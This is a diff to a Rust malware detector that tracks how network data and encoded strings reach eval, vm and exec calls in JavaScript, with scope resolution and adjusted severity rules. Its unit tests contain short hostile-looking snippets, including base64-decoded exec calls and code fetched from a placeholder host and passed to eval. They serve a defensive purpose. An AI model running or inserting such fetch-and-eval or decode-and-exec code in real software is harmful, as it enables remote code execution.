@@ -54,6 +54,9 @@ pub(crate) struct Found {
     pub start: usize,
     pub end: usize,
     pub reason: String,
+    /// The file writes no URL, so what it fetches is not visible in it: the
+    /// level is one below the rule's (`run.js-fetch-eval` only).
+    pub lowered: bool,
 }
 
 #[derive(Debug, Clone, Default)]
@@ -94,6 +97,10 @@ impl Taint {
         before != (self.bits, self.net.is_some(), self.blob.is_some())
     }
 }
+
+/// A name and the token where it is bound or assigned, which tells which
+/// variable of that name is meant (see `Flow::resolve`).
+type Bound = (String, usize);
 
 #[derive(Clone, Copy, PartialEq, Eq)]
 enum SinkClass {
@@ -162,6 +169,9 @@ const SINK_WORDS: &[&str] = &[
     "\\x",
 ];
 
+/// The scope of a name declared at the top of the file.
+const FILE_SCOPE: usize = usize::MAX - 1;
+
 /// Most tokens an expression is followed through.
 const MAX_EXPR_TOKENS: usize = 1000;
 
@@ -180,7 +190,18 @@ pub(crate) fn flow(text: &str) -> Vec<Found> {
 struct Flow<'a> {
     text: &'a str,
     lx: &'a Lexed,
-    names: HashMap<String, Taint>,
+    /// The taint of each variable, by name and by the start of the scope that
+    /// declares it (`usize::MAX` for a name nothing declares).
+    names: HashMap<(String, usize), Taint>,
+    tainted_names: HashSet<String>,
+    /// For each name, the blocks (the index of their `{`, or `u32::MAX` for the
+    /// file) in which a `const`, `let`, `var` or function declaration binds it.
+    decl_blocks: HashMap<String, HashSet<u32>>,
+    /// For each name, the token ranges in which a parameter binds it, sorted by
+    /// their start: a function's parameters and body, a `catch` clause.
+    decl_ranges: HashMap<String, Vec<(usize, usize)>>,
+    /// The innermost `{` around each token, `u32::MAX` outside any.
+    enclosing: Vec<u32>,
     net_alias: HashSet<String>,
     net_fn: HashSet<String>,
     sink_alias: HashMap<String, SinkClass>,
@@ -198,6 +219,10 @@ impl<'a> Flow<'a> {
             text,
             lx,
             names: HashMap::new(),
+            tainted_names: HashSet::new(),
+            decl_blocks: HashMap::new(),
+            decl_ranges: HashMap::new(),
+            enclosing: Vec::new(),
             net_alias: HashSet::new(),
             net_fn: HashSet::new(),
             sink_alias: HashMap::new(),
@@ -280,6 +305,7 @@ impl<'a> Flow<'a> {
             start: token.start as usize,
             end: token.end as usize,
             reason,
+            lowered: false,
         });
     }
 
@@ -334,7 +360,7 @@ impl<'a> Flow<'a> {
         } else if self.punct(end, b'}')
             && let Some(open) = self.partner(end)
         {
-            for name in self.pattern_names(open, end) {
+            for (name, _) in self.pattern_names(open, end) {
                 if net {
                     self.net_fn.insert(name.clone());
                 }
@@ -474,6 +500,41 @@ impl<'a> Flow<'a> {
         }
     }
 
+    /// Whether the call whose `(` is at `open` has `least` arguments or more, or
+    /// spreads one.
+    fn many_args(&self, open: usize, least: usize) -> bool {
+        let Some(close) = self.partner(open) else {
+            return false;
+        };
+        let mut count = 1;
+        let mut k = open + 1;
+        while k < close {
+            if self.punct(k, b'.') && self.punct(k + 1, b'.') && self.punct(k + 2, b'.') {
+                return true;
+            }
+            if self.punct(k, b',') {
+                count += 1;
+            }
+            k = match self.partner(k).filter(|_| self.is_open(k)) {
+                Some(end) => end + 1,
+                None => k + 1,
+            };
+        }
+        count >= least
+    }
+
+    /// Where the first argument of the call at `open` ends.
+    fn first_arg_end(&self, open: usize, close: usize) -> usize {
+        let mut k = open + 1;
+        while k < close && !self.punct(k, b',') {
+            k = match self.partner(k).filter(|_| self.is_open(k)) {
+                Some(end) => end + 1,
+                None => k + 1,
+            };
+        }
+        k.min(close)
+    }
+
     /// The decoder the identifier at `k` starts, if it is one.
     fn decoder(&self, k: usize) -> Option<&'static str> {
         let name = self.name(k)?;
@@ -483,9 +544,10 @@ impl<'a> Flow<'a> {
             "String"
                 if self.punct(k + 1, b'.')
                     && self.is_id(k + 2, "fromCharCode")
-                    && self.punct(k + 3, b'(') =>
+                    && self.punct(k + 3, b'(')
+                    && self.many_args(k + 3, 8) =>
             {
-                Some("String.fromCharCode")
+                Some("String.fromCharCode with many codes")
             }
             "Buffer" => {
                 let open = if self.punct(k + 1, b'.')
@@ -524,7 +586,198 @@ impl<'a> Flow<'a> {
             return Some(Taint::blob(label));
         }
         let name = self.name(k)?;
-        self.names.get(&*name).cloned()
+        if !self.tainted_names.contains(&*name) {
+            return None;
+        }
+        let scope = self.resolve(&name, k);
+        self.names.get(&(name.into_owned(), scope)).cloned()
+    }
+
+    /// Which variable named `name` the token `at` means: the scope that declares
+    /// it and surrounds `at` most closely (the index of the token that starts
+    /// the scope), `FILE_SCOPE` for a declaration at the top of the file, or
+    /// `usize::MAX` for a global or an undeclared name.
+    fn resolve(&self, name: &str, at: usize) -> usize {
+        let mut best: Option<usize> = None;
+        if let Some(list) = self.decl_ranges.get(name) {
+            let upto = list.partition_point(|range| range.0 <= at);
+            best = list[..upto]
+                .iter()
+                .rev()
+                .take(16)
+                .find(|range| at <= range.1)
+                .map(|range| range.0);
+        }
+        if let Some(blocks) = self.decl_blocks.get(name) {
+            let mut block = self.enclosing.get(at).copied().unwrap_or(u32::MAX);
+            for _ in 0..256 {
+                if blocks.contains(&block) {
+                    let scope = if block == u32::MAX {
+                        FILE_SCOPE
+                    } else {
+                        block as usize
+                    };
+                    // The scope that starts later is the inner one; the top of the
+                    // file is the outermost.
+                    let rank = |scope: usize| if scope == FILE_SCOPE { 0 } else { scope + 1 };
+                    if best.is_none_or(|found| rank(scope) > rank(found)) {
+                        best = Some(scope);
+                    }
+                    break;
+                }
+                if block == u32::MAX {
+                    break;
+                }
+                block = self.enclosing[block as usize];
+            }
+        }
+        best.unwrap_or(usize::MAX)
+    }
+
+    /// The innermost `{` around every token.
+    fn compute_enclosing(&mut self) {
+        let mut stack: Vec<u32> = Vec::new();
+        self.enclosing = Vec::with_capacity(self.n());
+        for i in 0..self.n() {
+            self.enclosing
+                .push(stack.last().copied().unwrap_or(u32::MAX));
+            if self.punct(i, b'{') {
+                stack.push(i as u32);
+            } else if self.punct(i, b'}') {
+                stack.pop();
+            }
+        }
+    }
+
+    fn declare_in_block(&mut self, name: String, block: u32) {
+        self.decl_blocks.entry(name).or_default().insert(block);
+    }
+
+    fn declare_in_range(&mut self, name: String, start: usize, end: usize) {
+        self.decl_ranges.entry(name).or_default().push((start, end));
+    }
+
+    /// Records where names are declared, so that a name means one variable at a
+    /// time and not every variable of that name in the file (a bundle holds
+    /// thousands of functions whose parameter is called `e`).
+    fn collect_decls(&mut self) {
+        let n = self.n();
+        for d in 0..n {
+            if !self.tick() {
+                return;
+            }
+            let block = self.enclosing[d];
+            let Some(word) = self.name(d) else {
+                if self.punct(d, b'=') && self.punct(d + 1, b'>') && self.lx.adjacent(d + 1) {
+                    self.declare_arrow(d);
+                } else if self.punct(d, b'(') && d > 0 {
+                    self.declare_method(d);
+                }
+                continue;
+            };
+            if self.prev_dot(d) {
+                continue;
+            }
+            match &*word {
+                "const" | "let" | "var" => {
+                    let mut k = d + 1;
+                    for _ in 0..64 {
+                        let (names, next) = match self.kind(k) {
+                            Some(Kind::Ident) => match self.name(k) {
+                                Some(name) => (vec![(name.into_owned(), k)], k + 1),
+                                None => break,
+                            },
+                            Some(Kind::Punct(b'{' | b'[')) => match self.partner(k) {
+                                Some(end) => (self.pattern_names(k, end), end + 1),
+                                None => break,
+                            },
+                            _ => break,
+                        };
+                        for (name, _) in names {
+                            self.declare_in_block(name, block);
+                        }
+                        let end = if self.punct(next, b'=') {
+                            self.expr_end(next + 1)
+                        } else {
+                            next
+                        };
+                        if self.punct(end, b',') {
+                            k = end + 1;
+                        } else {
+                            break;
+                        }
+                    }
+                }
+                "function" => {
+                    let mut p = d + 1;
+                    if let Some(name) = self.name(p)
+                        && self.punct(p + 1, b'(')
+                    {
+                        self.declare_in_block(name.into_owned(), block);
+                        p += 1;
+                    }
+                    self.declare_params(p);
+                }
+                "catch" if self.punct(d + 1, b'(') => self.declare_params(d + 1),
+                _ => {}
+            }
+        }
+        for list in self.decl_ranges.values_mut() {
+            list.sort_unstable();
+            list.dedup();
+        }
+    }
+
+    /// The parameters in the parentheses at `p`, scoped to the braces after
+    /// them (a function body, a `catch` block).
+    fn declare_params(&mut self, p: usize) {
+        if !self.punct(p, b'(') {
+            return;
+        }
+        let Some(close) = self.partner(p) else {
+            return;
+        };
+        let end = if self.punct(close + 1, b'{') {
+            self.partner(close + 1).unwrap_or(self.n())
+        } else {
+            close
+        };
+        for (name, _) in self.param_list(p, close) {
+            self.declare_in_range(name, p, end);
+        }
+    }
+
+    /// `name(params) {`: a method.
+    fn declare_method(&mut self, p: usize) {
+        let Some(name) = self.name(p - 1) else {
+            return;
+        };
+        if CONTROL.contains(&&*name) || !self.partner(p).is_some_and(|c| self.punct(c + 1, b'{')) {
+            return;
+        }
+        self.declare_params(p);
+    }
+
+    /// The parameters of the arrow function whose `=>` starts at `at`.
+    fn declare_arrow(&mut self, at: usize) {
+        let (names, start) = if at > 0 && self.punct(at - 1, b')') {
+            match self.partner(at - 1) {
+                Some(open) => (self.param_list(open, at - 1), open),
+                None => return,
+            }
+        } else if let Some(name) = self.name(at.saturating_sub(1)) {
+            (vec![(name.into_owned(), at - 1)], at - 1)
+        } else {
+            return;
+        };
+        let end = if self.punct(at + 2, b'{') {
+            self.partner(at + 2).unwrap_or(self.n())
+        } else {
+            self.expr_end(at + 2)
+        };
+        for (name, _) in names {
+            self.declare_in_range(name, start, end);
+        }
     }
 
     /// The taint of the tokens `a..b`: what flows into an expression written
@@ -607,7 +860,7 @@ impl<'a> Flow<'a> {
     }
 
     /// The names an assignment whose `=` is at `j` gives a value to.
-    fn lhs_names(&self, j: usize) -> Vec<String> {
+    fn lhs_names(&self, j: usize) -> Vec<Bound> {
         let mut p = j.saturating_sub(1);
         while p > 0
             && self.lx.adjacent(p + 1)
@@ -646,14 +899,14 @@ impl<'a> Flow<'a> {
     }
 
     /// The first name of the chain `a.b[c].d` that ends at `p`.
-    fn base_name(&self, mut p: usize) -> Option<String> {
+    fn base_name(&self, mut p: usize) -> Option<Bound> {
         for _ in 0..100 {
             match self.kind(p) {
                 Some(Kind::Ident) => {
                     if p >= 2 && self.punct(p - 1, b'.') {
                         p -= 2;
                     } else {
-                        return self.name(p).map(Cow::into_owned);
+                        return self.name(p).map(|n| (n.into_owned(), p));
                     }
                 }
                 Some(Kind::Punct(b')' | b']')) => {
@@ -670,7 +923,7 @@ impl<'a> Flow<'a> {
     }
 
     /// The names bound by a destructuring pattern between `open` and `close`.
-    fn pattern_names(&self, open: usize, close: usize) -> Vec<String> {
+    fn pattern_names(&self, open: usize, close: usize) -> Vec<Bound> {
         let mut names = Vec::new();
         for k in open + 1..close {
             let Some(name) = self.name(k) else { continue };
@@ -680,7 +933,7 @@ impl<'a> Flow<'a> {
                     Some(Kind::Punct(b'{' | b'[' | b',' | b':'))
                 );
             if after_separator && !self.punct(k + 1, b':') && !matches!(&*name, "async" | "await") {
-                names.push(name.into_owned());
+                names.push((name.into_owned(), k));
             }
             if names.len() >= 64 {
                 break;
@@ -829,13 +1082,15 @@ impl<'a> Flow<'a> {
         taint
     }
 
-    fn taint_names(&mut self, names: &[String], taint: &Taint) -> bool {
+    fn taint_names(&mut self, names: &[Bound], taint: &Taint) -> bool {
         let mut changed = false;
         if taint.bits == 0 {
             return false;
         }
-        for name in names {
-            let entry = self.names.entry(name.clone()).or_default();
+        for (name, at) in names {
+            let scope = self.resolve(name, *at);
+            self.tainted_names.insert(name.clone());
+            let entry = self.names.entry((name.clone(), scope)).or_default();
             changed |= entry.merge(taint);
         }
         changed
@@ -855,13 +1110,13 @@ impl<'a> Flow<'a> {
                 continue;
             }
             // `const run = eval;`
-            if let [name] = names.as_slice()
+            if let [(name, _)] = names.as_slice()
                 && let Some(class) = self.sink_reference(j + 1)
             {
                 self.sink_alias.entry(name.clone()).or_insert(class);
             }
             // `const api = axios.create(...)`
-            if let [name] = names.as_slice()
+            if let [(name, _)] = names.as_slice()
                 && self.is_net_factory(j + 1)
                 && self.net_alias.insert(name.clone())
             {
@@ -935,13 +1190,13 @@ impl<'a> Flow<'a> {
                 continue;
             };
             let taint = self.returns_taint(close + 1, body_close);
-            changed |= self.taint_names(&[name.into_owned()], &taint);
+            changed |= self.taint_names(&[(name.into_owned(), i - 1)], &taint);
         }
         changed
     }
 
     /// The parameter names of the function written at `s`, if one is.
-    fn function_params(&self, s: usize) -> Option<Vec<String>> {
+    fn function_params(&self, s: usize) -> Option<Vec<Bound>> {
         let mut k = s;
         if self.is_id(k, "async") {
             k += 1;
@@ -964,12 +1219,12 @@ impl<'a> Flow<'a> {
             return arrow(close + 1).then(|| self.param_list(k, close));
         }
         if self.kind(k) == Some(Kind::Ident) && arrow(k + 1) {
-            return self.name(k).map(|n| vec![n.into_owned()]);
+            return self.name(k).map(|n| vec![(n.into_owned(), k)]);
         }
         None
     }
 
-    fn param_list(&self, open: usize, close: usize) -> Vec<String> {
+    fn param_list(&self, open: usize, close: usize) -> Vec<Bound> {
         let mut names = Vec::new();
         let mut k = open + 1;
         while k < close {
@@ -977,7 +1232,7 @@ impl<'a> Flow<'a> {
                 let starts =
                     self.punct(k - 1, b'(') || self.punct(k - 1, b',') || self.punct(k - 1, b'.');
                 if starts && names.len() < 64 {
-                    names.push(name.into_owned());
+                    names.push((name.into_owned(), k));
                 }
             } else if self.is_open(k)
                 && let Some(end) = self.partner(k)
@@ -1032,7 +1287,7 @@ impl<'a> Flow<'a> {
                 continue;
             };
             // Only calls that pass a function are worth a chain walk.
-            let mut params: Vec<Vec<String>> = Vec::new();
+            let mut params: Vec<Vec<Bound>> = Vec::new();
             let mut s = i + 1;
             while s < close {
                 if let Some(list) = self.function_params(s) {
@@ -1120,7 +1375,7 @@ impl<'a> Flow<'a> {
                         .is_some_and(|m| matches!(&*m, "call" | "apply" | "bind"))
                     && self.punct(next + 2, b'(')
                 {
-                    return Some((SinkClass::Code, "eval".into(), next + 2));
+                    return Some((SinkClass::Code, "eval.call".into(), next + 2));
                 }
                 None
             }
@@ -1234,25 +1489,44 @@ impl<'a> Flow<'a> {
                 }
             }
         }
+        // Whether the file writes the address of a remote host anywhere.
+        let remote_url = (0..self.n()).any(|k| {
+            matches!(self.kind(k), Some(Kind::Str | Kind::Template))
+                && self.lx.raw(self.text, k).contains("://")
+        });
         for (i, class, label, open) in sinks {
             let Some(close) = self.partner(open) else {
                 continue;
             };
-            let taint = self.range_taint(open + 1, close);
+            // The code is the first argument of eval, vm and _compile; the rest are
+            // options (a `cachedData` buffer is not code). Function takes it all.
+            let code_end = if first_arg_only(&label) {
+                self.first_arg_end(open, close)
+            } else {
+                close
+            };
+            let taint = self.range_taint(open + 1, code_end);
             // `Function("require", ...)` called with `require`.
             if class == SinkClass::Code && matches!(label.as_str(), "new Function" | "Function") {
                 self.function_require(i, open, close, &mut function_vars);
             }
             if class == SinkClass::Code && taint.bits & NET != 0 {
-                self.add(
-                    FoundKind::FetchEval,
-                    i,
-                    format!(
-                        "`{label}` runs data that came from a network call ({}) in the same file: \
-                         code is downloaded and run, which is how loaders work",
-                        taint.net.as_deref().unwrap_or("network")
-                    ),
+                let mut reason = format!(
+                    "`{label}` runs data that came from a network call ({}) in the same file: \
+                     code is downloaded and run, which is how loaders work",
+                    taint.net.as_deref().unwrap_or("network")
                 );
+                if !remote_url {
+                    reason.push_str(
+                        "; the file writes no URL (the address may be relative or come from \
+                         elsewhere), which is how some honest test pages and tools do it, so \
+                         the level is one lower",
+                    );
+                }
+                self.add(FoundKind::FetchEval, i, reason);
+                if let Some(found) = self.found.last_mut() {
+                    found.lowered = !remote_url;
+                }
             } else if taint.bits & BLOB != 0 {
                 self.add(
                     FoundKind::Encoded,
@@ -1315,6 +1589,7 @@ impl<'a> Flow<'a> {
             if let Some((offset, what)) = cut {
                 self.found.push(Found {
                     kind: FoundKind::Uncertain,
+                    lowered: false,
                     start: offset.min(self.text.len().saturating_sub(1)),
                     end: offset.min(self.text.len()),
                     reason: format!(
@@ -1325,6 +1600,7 @@ impl<'a> Flow<'a> {
             } else if self.lx.truncated || self.over_budget {
                 self.found.push(Found {
                     kind: FoundKind::Uncertain,
+                    lowered: false,
                     start: 0,
                     end: 0,
                     reason: format!(
@@ -1377,6 +1653,8 @@ impl<'a> Flow<'a> {
     }
 
     fn run(mut self) -> Vec<Found> {
+        self.compute_enclosing();
+        self.collect_decls();
         self.bind_pass();
         for _ in 0..MAX_PASSES {
             let mut changed = self.assign_pass();
@@ -1393,6 +1671,21 @@ impl<'a> Flow<'a> {
             .dedup_by(|a, b| a.start == b.start && a.kind == b.kind);
         self.found
     }
+}
+
+/// Sinks whose first argument is the code and the rest are options.
+fn first_arg_only(label: &str) -> bool {
+    matches!(
+        label,
+        "eval"
+            | "indirect eval"
+            | "runInThisContext"
+            | "runInNewContext"
+            | "runInContext"
+            | "compileFunction"
+            | "_compile"
+            | "vm.Script"
+    )
 }
 
 fn function_require_reason() -> String {
@@ -1417,8 +1710,11 @@ fn blob_literal(raw: &str) -> Option<&'static str> {
     {
         return Some("a long base64 string");
     }
-    let escapes = inner.matches("\\x").count() + inner.matches("\\u").count();
-    (escapes >= 8).then_some("a string of escape sequences")
+    // Byte escapes (`\x41`) are how a payload is spelled out; `\u` escapes are
+    // also how text in another script is written, so they need many more.
+    let bytes = inner.matches("\\x").count();
+    let units = inner.matches("\\u").count();
+    (bytes >= 16 || units >= 32).then_some("a string of escape sequences")
 }
 
 // ---------------------------------------------------------------- hits
@@ -1449,6 +1745,11 @@ fn flow_hits(ctx: &Ctx<'_>, wanted: &[(FoundKind, Severity)]) -> Vec<Hit> {
                 .iter()
                 .find(|(kind, _)| *kind == found.kind)
                 .map(|&(_, severity)| {
+                    let severity = if found.lowered {
+                        severity.min(Severity::High)
+                    } else {
+                        severity
+                    };
                     hit(ctx, found.start, found.end, severity, found.reason.clone())
                 })
         })
@@ -1660,7 +1961,7 @@ mod tests {
             "new Function(Buffer.from(x, 'base64').toString())();",
             "execSync(Buffer.from(x, 'hex').toString());",
             "const { exec } = require('child_process');\nexec(unescape(x));",
-            "eval(String.fromCharCode(1, 2, 3));",
+            "eval(String.fromCharCode(1, 2, 3, 4, 5, 6, 7, 8));",
         ] {
             assert_eq!(
                 kinds(text)
@@ -1671,7 +1972,9 @@ mod tests {
                 "{text}"
             );
         }
-        // The regular expression method of the same name is not a command.
+        // A few character codes are ordinary text; the regular expression method
+        // of the same name is not a command.
+        assert!(kinds("eval(String.fromCharCode(0x2028));").is_empty());
         assert!(kinds("const m = /a/.exec(atob(x));").is_empty());
         assert!(kinds("const logo = 'x'; execSync('git status');").is_empty());
     }
@@ -1682,6 +1985,47 @@ mod tests {
         let text = format!("const p = \"{blob}\";\neval(p);");
         assert_eq!(kinds(&text).len(), 1);
         assert!(kinds(&format!("const p = \"{blob}\";\nconsole.log(p);")).is_empty());
+    }
+
+    #[test]
+    fn a_name_means_one_variable_at_a_time() {
+        // `content` is network data in one function and a parameter in another.
+        let text = "function a(u){ const content = axios.get(u); return content; }\n\
+                    function b(content){ eval(content); }";
+        assert_eq!(fetch_eval_count(text), 0);
+        // The same function sees it.
+        let text = "function a(u){ const content = axios.get(u); eval(content); }";
+        assert_eq!(fetch_eval_count(text), 1);
+        // A variable of the enclosing function is seen from a nested callback.
+        let text = "function a(u){ let b = ''; https.get(u, res => { res.on('data', c => { b += c; }); \
+                    res.on('end', () => { eval(b); }); }); }";
+        assert_eq!(
+            fetch_eval_count(&format!("const https = require('https');\n{text}")),
+            1
+        );
+        // A parameter that shadows a tainted outer name is not tainted.
+        let text = "const d = await axios.get(u);\nfunction f(d){ eval(d); }\nf('1');";
+        assert_eq!(fetch_eval_count(text), 0);
+    }
+
+    #[test]
+    fn only_the_first_argument_of_eval_and_vm_is_code() {
+        let text = "const o = Buffer.from(x, 'base64');\nnew vm.Script('1', { cachedData: o });";
+        assert!(kinds(text).is_empty(), "{:?}", kinds(text));
+        let text = "const c = await fetch(u);\nnew vm.Script('1', { cachedData: c });";
+        assert!(kinds(text).is_empty(), "{:?}", kinds(text));
+        let text = "const c = await fetch(u);\nnew vm.Script(c, { filename: 'x' });";
+        assert_eq!(fetch_eval_count(text), 1);
+    }
+
+    #[test]
+    fn a_file_without_a_url_is_one_level_lower() {
+        let relative = flow("const c = await fetch('/a.js').then(r => r.text());\neval(c);");
+        assert!(relative[0].lowered);
+        let absolute = flow(
+            "const c = await fetch('https://a.example.invalid/a.js').then(r => r.text());\neval(c);",
+        );
+        assert!(!absolute[0].lowered);
     }
 
     #[test]
